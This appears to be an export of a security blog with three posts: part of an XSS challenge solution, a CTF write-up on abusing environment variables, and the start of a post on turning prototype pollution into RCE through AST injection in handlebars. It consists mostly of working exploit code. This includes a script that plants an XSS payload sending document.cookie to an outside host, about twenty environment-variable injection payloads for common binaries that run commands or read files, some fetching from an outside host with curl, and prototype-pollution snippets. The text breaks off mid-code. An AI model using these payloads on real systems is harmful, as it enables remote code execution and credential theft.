tag.<br>Such misinterpretion can be used to bypass non-script sanitizer like sanitize-html.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> marked = <span class="built_in">require</span>(<span class="string">&#x27;marked&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sanitizeHtml = <span class="built_in">require</span>(<span class="string">&#x27;sanitize-html&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> nodeHtmlParser = <span class="built_in">require</span>(<span class="string">&#x27;node-html-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&quot;&lt;/header &lt;a&gt;&lt;a&gt;&lt;a&lt;a\x0bonx=a &quot;</span>;</span><br><span class="line"></span><br><span class="line">html = marked.<span class="title function_">parse</span>(html);</span><br><span class="line">html = <span class="title function_">sanitizeHtml</span>(html);</span><br><span class="line">html = nodeHtmlParser.<span class="title function_">parse</span>(html).<span class="property">outerHTML</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html);</span><br></pre></td></tr></table></figure><p>When it comes to the case used with <code>marked</code>, The condition gets a little more complicated because <code>marked</code> also mutates input string.</p><p>So I wrote <a href="https://github.com/posix-lee/jsfuxx">a generic DOM based dumb fuzzer for javascript</a> to find. You can check the link If you interested.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mport requests, random</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://1.230.253.91:3000&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">res = s.post(HOST + <span class="string">&#x27;/login&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;posix&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1337&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">res = s.post(HOST + <span class="string">&#x27;/new&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;abcd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&quot;&lt;/header &lt;a&gt;&lt;a\t&gt;&lt;h&lt;a\x0Bstyle=&#x27;animation-name:spinner-donut-anim&#x27;onanimationend=&#x27;fetch(`http:\\x2f\\x2fp6.is\\x2f$&#123;document.cookie&#125;`)&#x27; &quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>So above is the intended solution creates a note including XSS payload doesn’t require any user-interaction.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Abusing Environment Variables</title>
      <link href="/Abusing-Environment-Variables/"/>
      <url>/Abusing-Environment-Variables/</url>
      
        <content type="html"><![CDATA[<blockquote><p>This article includes solution of <a href="http://challenge.p6.is/0" target="_blank" rel="noopener">http://challenge.p6.is/0</a></p></blockquote><p><img src="/img/2020/09/1.png" alt="image-20200906210533589"></p><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>I found interesting code while do an analysis of the effects of nodejs internal effects.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.shell) &#123;</span><br><span class="line">  <span class="keyword">const</span> command = [file].concat(args).join(<span class="string">' '</span>);</span><br><span class="line">  <span class="comment">// Set the shell, switches, and commands.</span></span><br><span class="line">  <span class="keyword">if</span> (process.platform === <span class="string">'win32'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options.shell === <span class="string">'string'</span>)</span><br><span class="line">      file = options.shell;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      file = process.env.comspec || <span class="string">'cmd.exe'</span>;</span><br><span class="line">    <span class="comment">// '/d /s /c' is used only for cmd.exe.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:.*\\)?cmd(?:\.exe)?$/i</span>.test(file)) &#123;</span><br><span class="line">      args = [<span class="string">'/d'</span>, <span class="string">'/s'</span>, <span class="string">'/c'</span>, <span class="string">`"<span class="subst">$&#123;command&#125;</span>"`</span>];</span><br><span class="line">      windowsVerbatimArguments = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      args = [<span class="string">'-c'</span>, command];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options.shell === <span class="string">'string'</span>)</span><br><span class="line">      file = options.shell;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (process.platform === <span class="string">'android'</span>)</span><br><span class="line">      file = <span class="string">'/system/bin/sh'</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      file = <span class="string">'/bin/sh'</span>;</span><br><span class="line">    args = [<span class="string">'-c'</span>, command];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>through <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js#L502" target="_blank" rel="noopener">https://github.com/nodejs/node/blob/master/lib/child_process.js#L502</a>, in the child_process, one of builtin module of nodejs.<br>By specifying the shell option, I was able to override the default shell used to run the command.</p><p>and from <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js#L528" target="_blank" rel="noopener">https://github.com/nodejs/node/blob/master/lib/child_process.js#L528</a><br>We could know the child processes creation uses <code>for ... in</code> loop for setting child process’s environment variabless<br>it can be seen that the environment variables are also referred to Object.prototype.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.shell = <span class="string">'node'</span>;</span><br><span class="line"><span class="built_in">Object</span>.prototype.env = &#123;</span><br><span class="line">   NODE_DEBUG : <span class="string">'1; throw require("child_process").execSync("sleep 7").toString()//'</span>,</span><br><span class="line">   NODE_OPTIONS : <span class="string">'-r /proc/self/environ'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">child_process.execSync(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure><p>By overriding Object.prototype.shell, We can run any binary and make command execution even if the origin command is not vulnerable for this.</p><p>However, since nodejs have context-dependency in order of environment variables in /proc/self/environ when creating child processes.<br>I want to know about other general binaries have detected how attacks can be carried out.</p><p>After searching a time, I could found an interesting <a href="https://www.elttam.com/blog/env/" target="_blank" rel="noopener">article</a></p><p>Several interpreter languages have been able to carry out attacks in this way.<br>We’ve opened the challenge for more diverse navigation and data collection.</p><p>As a result, many people showed interesting solutions.<br>Thank you to <a href="https://twitter.com/KuroNeko10x" target="_blank" rel="noopener">@KuroNeko10x</a> <a href="https://twitter.com/SecurityMB" target="_blank" rel="noopener">@SecurityMB</a> <a href="https://twitter.com/acut3hack" target="_blank" rel="noopener">acut3hack</a> <a href="https://twitter.com/panghoddari" target="_blank" rel="noopener">@panghoddari</a> <a href="https://twitter.com/HunterGregal" target="_blank" rel="noopener">@HunterGregal</a> jinmo123 dmbs335 <a href="https://twitter.com/03sunf" target="_blank" rel="noopener">@03sunf</a> <a href="https://twitter.com/nko_d8" target="_blank" rel="noopener">NGA</a> <a href="https://twitter.com/__Sehun_Oh__" target="_blank" rel="noopener">@shpik</a> <a href="https://twitter.com/r0hanSH" target="_blank" rel="noopener">@r0hanSH</a> for participating.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="usr-bin-node"><a href="#usr-bin-node" class="headerlink" title="/usr/bin/node"></a>/usr/bin/node</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;node</span><br><span class="line">&amp;p[]&#x3D;NODE_OPTIONS&#x3D;--require &#x2F;proc&#x2F;self&#x2F;environ</span><br><span class="line">&amp;p[]&#x3D;PHP_EXTRA_CONFIGURE_ARGS&#x3D;console.log(require(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#x2F;f1444g&#39;).toString())&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="usr-local-bin-php"><a href="#usr-local-bin-php" class="headerlink" title="/usr/local/bin/php"></a>/usr/local/bin/php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;php</span><br><span class="line">&amp;p[]&#x3D;PHP_EXTRA_CONFIGURE_ARGS&#x3D;1;%0dauto_prepend_file&#x3D;&#x2F;proc&#x2F;self&#x2F;environ;%0d&lt;?php system(&quot;cat &#x2F;flag&#x2F;f1444g&quot;);?&gt;</span><br><span class="line">&amp;p[]&#x3D;PHPRC&#x3D;&#x2F;proc&#x2F;self&#x2F;environ</span><br></pre></td></tr></table></figure><h2 id="usr-bin-perl"><a href="#usr-bin-perl" class="headerlink" title="/usr/bin/perl"></a>/usr/bin/perl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;perl</span><br><span class="line">&amp;p[]&#x3D;PERL5OPT&#x3D;d</span><br><span class="line">&amp;p[]&#x3D;PERL5DB&#x3D;BEGIN&#123;$f&#x3D;&#96;ls &#x2F;flag&#96;; print &#96;cat &#x2F;flag&#x2F;$f&#96;&#125;</span><br></pre></td></tr></table></figure><h2 id="bin-bash"><a href="#bin-bash" class="headerlink" title="/bin/bash"></a>/bin/bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">&amp;p[]&#x3D;BASH_ENV&#x3D;&#96;curl p6.is&#96;</span><br></pre></td></tr></table></figure><h2 id="usr-bin-bashbug"><a href="#usr-bin-bashbug" class="headerlink" title="/usr/bin/bashbug"></a>/usr/bin/bashbug</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;bashbug</span><br><span class="line">&amp;p[]&#x3D;DEFEDITOR&#x3D;cat &#x2F;flag&#x2F;* &gt;</span><br></pre></td></tr></table></figure><h2 id="usr-bin-less"><a href="#usr-bin-less" class="headerlink" title="/usr/bin/less"></a>/usr/bin/less</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;less</span><br><span class="line">&amp;p[]&#x3D;LESSOPEN&#x3D;curl p6.is</span><br><span class="line">&amp;p[]&#x3D;LESS&#x3D;-?&#x2F;bin&#x2F;ls</span><br></pre></td></tr></table></figure><h2 id="usr-bin-vim"><a href="#usr-bin-vim" class="headerlink" title="/usr/bin/vim"></a>/usr/bin/vim</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;vim</span><br><span class="line">&amp;p[]&#x3D;VIMINIT&#x3D;exe &quot;!&#x2F;usr&#x2F;bin&#x2F;rgrep . &#x2F;flag&quot; | q!</span><br></pre></td></tr></table></figure><h2 id="usr-bin-byobu-status-detail"><a href="#usr-bin-byobu-status-detail" class="headerlink" title="/usr/bin/byobu-status-detail"></a>/usr/bin/byobu-status-detail</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;byobu-status-detail</span><br><span class="line">&amp;p[]&#x3D;PATH&#x3D;&#x2F;bin</span><br><span class="line">&amp;p[]&#x3D;BYOBU_INCLUDED_LIBS&#x3D;1</span><br><span class="line">&amp;p[]&#x3D;BYOBU_PAGER&#x3D;&#x2F;bin&#x2F;cat &#x2F;flag&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="usr-bin-byobu"><a href="#usr-bin-byobu" class="headerlink" title="/usr/bin/byobu"></a>/usr/bin/byobu</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;byobu</span><br><span class="line">&amp;p[]&#x3D;BYOBU_CONFIG_DIR&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">&amp;p[]&#x3D;BYOBU_RUN_DIR&#x3D;&#x2F;tmp</span><br><span class="line">&amp;p[]&#x3D;BYOBU_INCLUDED_LIBS&#x3D;1</span><br><span class="line">&amp;p[]&#x3D;HOME&#x3D;&#x2F;var&#x2F;cache&#x2F;apache2&#x2F;mod_cache_disk</span><br><span class="line">&amp;p[]&#x3D;BYOBU_TEST&#x3D;cd &#x2F;; ls -al &#x2F;home &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;eyo 2&gt;</span><br></pre></td></tr></table></figure><h2 id="usr-bin-file"><a href="#usr-bin-file" class="headerlink" title="/usr/bin/file"></a>/usr/bin/file</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;file</span><br><span class="line">&amp;p[]&#x3D;MAGIC&#x3D;&#x2F;flag&#x2F;::</span><br></pre></td></tr></table></figure><h2 id="bin-tar"><a href="#bin-tar" class="headerlink" title="/bin/tar"></a>/bin/tar</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;bin&#x2F;tar</span><br><span class="line">&amp;p[]&#x3D;TAPE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">&amp;p[]&#x3D;TAR_OPTIONS&#x3D;-x --use-compress-program&#x3D;&quot;sh -c \&quot;rgrep . &#x2F;flag &gt;&amp;2\&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="usr-bin-gs"><a href="#usr-bin-gs" class="headerlink" title="/usr/bin/gs"></a>/usr/bin/gs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;gs</span><br><span class="line">&amp;p[]&#x3D;GS_DEVICE&#x3D;bit</span><br><span class="line">&amp;p[]&#x3D;GS_OPTIONS&#x3D;@&#x2F;flag&#x2F;f1444g</span><br></pre></td></tr></table></figure><h2 id="bin-bzip2"><a href="#bin-bzip2" class="headerlink" title="/bin/bzip2"></a>/bin/bzip2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;bin&#x2F;bzip2</span><br><span class="line">&amp;p[]&#x3D;BZIP&#x3D;&#x2F;flag&#x2F;f1444g</span><br></pre></td></tr></table></figure><h2 id="bin-tar-1"><a href="#bin-tar-1" class="headerlink" title="/bin/tar"></a>/bin/tar</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;bin&#x2F;tar</span><br><span class="line">&amp;p[]&#x3D;TAPE&#x3D;&#x2F;usr&#x2F;src&#x2F;php.tar.xz</span><br><span class="line">&amp;p[]&#x3D;TAR_OPTIONS&#x3D;-x --to-command&#x3D;&quot;rgrep . &#x2F;flag&quot;</span><br></pre></td></tr></table></figure><h2 id="usr-bin-rake"><a href="#usr-bin-rake" class="headerlink" title="/usr/bin/rake"></a>/usr/bin/rake</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;rake</span><br><span class="line">&amp;p[]&#x3D;RAKEOPT&#x3D;-e &quot;print &#96;rgrep . &#x2F;flag&#96;&quot;</span><br></pre></td></tr></table></figure><h2 id="usr-bin-xz"><a href="#usr-bin-xz" class="headerlink" title="/usr/bin/xz"></a>/usr/bin/xz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;xz</span><br><span class="line">&amp;p[]&#x3D;XZ_OPT&#x3D;--files&#x3D;&#x2F;flag&#x2F;f1444g</span><br></pre></td></tr></table></figure><h2 id="usr-bin-zipinfo"><a href="#usr-bin-zipinfo" class="headerlink" title="/usr/bin/zipinfo"></a>/usr/bin/zipinfo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;zipinfo</span><br><span class="line">&amp;p[]&#x3D;ZIPINFO&#x3D;-s &#x2F;flag&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="usr-bin-zip"><a href="#usr-bin-zip" class="headerlink" title="/usr/bin/zip"></a>/usr/bin/zip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;zip</span><br><span class="line">&amp;p[]&#x3D;ZIPOPT&#x3D;&#x2F;tmp&#x2F;a.zip -T -TT&#96;cat$IFS$1&#x2F;flag&#x2F;f1444g;&#96;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;zip</span><br><span class="line">&amp;p[]&#x3D;ZIP&#x3D;-0 -r - &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="usr-bin-unzip"><a href="#usr-bin-unzip" class="headerlink" title="/usr/bin/unzip"></a>/usr/bin/unzip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;bin&#x2F;unzip</span><br><span class="line">&amp;p[]&#x3D;UNZIP&#x3D;-p &#x2F;tmp&#x2F;pwn.zip</span><br></pre></td></tr></table></figure><h2 id="bin-grep"><a href="#bin-grep" class="headerlink" title="/bin/grep"></a>/bin/grep</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;bin&#x2F;grep</span><br><span class="line">&amp;p[]&#x3D;GREP_OPTIONS&#x3D;-r . &#x2F;flag</span><br></pre></td></tr></table></figure><hr><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><blockquote><p>The extra solutions were not valid for this challenge.</p></blockquote><h2 id="usr-bin-systemctl"><a href="#usr-bin-systemctl" class="headerlink" title="/usr/bin/systemctl"></a>/usr/bin/systemctl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAGER&#x3D;&#39;ls &#x2F;&#39; systemctl</span><br></pre></td></tr></table></figure><h2 id="usr-bin-python"><a href="#usr-bin-python" class="headerlink" title="/usr/bin/python"></a>/usr/bin/python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYTHONSTARTUP&#x3D;&#39;&#x2F;etc&#x2F;passwd&#39; python</span><br></pre></td></tr></table></figure><h2 id="usr-bin-perl-1"><a href="#usr-bin-perl-1" class="headerlink" title="/usr/bin/perl"></a>/usr/bin/perl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PERL5OPT&#x3D;&#39;-Mbase;print(&#96;id&#96;)&#39; perl &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.elttam.com/blog/env/" target="_blank" rel="noopener">https://www.elttam.com/blog/env/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AST Injection, Prototype Pollution to RCE</title>
      <link href="/AST-Injection/"/>
      <url>/AST-Injection/</url>
      
        <content type="html"><![CDATA[<blockquote><p>This article describes how to trigger RCE<br>in two well-known template engines,<br>using a new technique called AST Injection.</p></blockquote><h2 id="AST-Injection"><a href="#AST-Injection" class="headerlink" title="AST Injection"></a>AST Injection</h2><h3 id="What-is-AST"><a href="#What-is-AST" class="headerlink" title="What is AST?"></a>What is AST?</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Abstract_syntax_tree</a></p></blockquote><h3 id="AST-in-NodeJS"><a href="#AST-in-NodeJS" class="headerlink" title="AST in NodeJS"></a>AST in NodeJS</h3><p><img src="/img/2020/08/graph_2.png" alt="img"></p><p>In NodeJS, AST is used in JS really often, as template engines and typescript etc.<br>For the template engine, the structure is as shown above.</p><p><img src="/img/2020/08/graph_3.jpg" alt="img"></p><p>If prototype pollution vulnerability exists in the JS application,<br>Any AST can be inserted in the function by making it insert during the <code>Parser</code> or <code>Compiler</code> process.</p><p>Here, you can insert AST without proper filtering of input (which has not been properly filtered) that has not been verified by lexer or parser.<br>Then, we can give unexpected input to the compiler.</p><p>Below is how to actually use AST Injection to execute arbitrary commands in <code>handlebars</code> and <code>pug</code></p><h2 id="Handlebars"><a href="#Handlebars" class="headerlink" title="Handlebars"></a>Handlebars</h2><p><img src="/img/2020/08/graph_4.jpg" alt="img"></p><p>Until today, <code>handlebars</code> has been downloaded a total of <code>998,602,213</code> times.<br>Handlebars are the most commonly used template engine except for ejs.</p><p>For newer versions, it is known to be safe because no command can be executed, even if any template can be inserted.</p><h3 id="How-to-Detect"><a href="#How-to-Detect" class="headerlink" title="How to Detect"></a>How to Detect</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Handlebars = <span class="built_in">require</span>(<span class="string">'handlebars'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = Handlebars.compile(source);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(template(&#123;<span class="string">"msg"</span>: <span class="string">"posix"</span>&#125;)); <span class="comment">// Hello posix</span></span><br></pre></td></tr></table></figure><p>Before you start, here’s how to use templates in handlebars.<br>The Handlebar.compile function converts a string into a template function and passes object factors for reference.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Handlebars = <span class="built_in">require</span>(<span class="string">'handlebars'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.pendingContent = <span class="string">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = Handlebars.compile(source);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(template(&#123;<span class="string">"msg"</span>: <span class="string">"posix"</span>&#125;)); <span class="comment">// &lt;script&gt;alert(origin)&lt;/script&gt;Hello posix</span></span><br></pre></td></tr></table></figure><p>In here, we can make influence to the compilation process using prototype pollution.</p><p>You can insert any string into <code>Object.prototype.pendingContent</code> to determine the possibility of an attack.<br>This allows you to be sure that servers are using handlebars engine when a prototype pollution exists in a black-box environment.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js --&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">appendContent: <span class="function"><span class="keyword">function</span> <span class="title">appendContent</span>(<span class="params">content</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.pendingContent) &#123;</span><br><span class="line">content = <span class="keyword">this</span>.pendingContent + content;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.pendingLocation = <span class="keyword">this</span>.source.currentLocation;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.pendingContent = content;</span><br><span class="line">&#125;,</span><br><span class="line">pushSource: <span class="function"><span class="keyword">function</span> <span class="title">pushSource</span>(<span class="params">source</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.pendingContent) &#123;</span><br><span class="line"><span class="keyword">this</span>.source.push(<span class="keyword">this</span>.appendToBuffer(<span class="keyword">this</span>.source.quotedString(<span class="keyword">this</span>.pendingContent), <span class="keyword">this</span>.pendingLocation));</span><br><span class="line"><span class="keyword">this</span>.pendingContent = <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (source) &#123;</span><br><span class="line"><span class="keyword">this</span>.source.push(source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>This is done by the <code>appendContent</code> function of <code>javascript-compiler.js</code><br><code>appendContent</code> is this.If <code>pendingContent</code> is present, append to the content and returns.</p><p><code>pushSource</code> makes the <code>pendingContent</code> to <code>undefined</code>, preventing the string from being inserted multiple times.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="/img/2020/08/graph_5.jpg" alt="img"></p><p>Handlebars work as shown in the graph above.</p><p>After lexer and parser generater AST, It passes to <code>compiler.js</code><br>We can run the template function compiler generated with some arguments.<br>and It returns the string like “Hello posix” (when msg is posix)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/parser.js --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">    <span class="keyword">this</span>.$ = &#123; <span 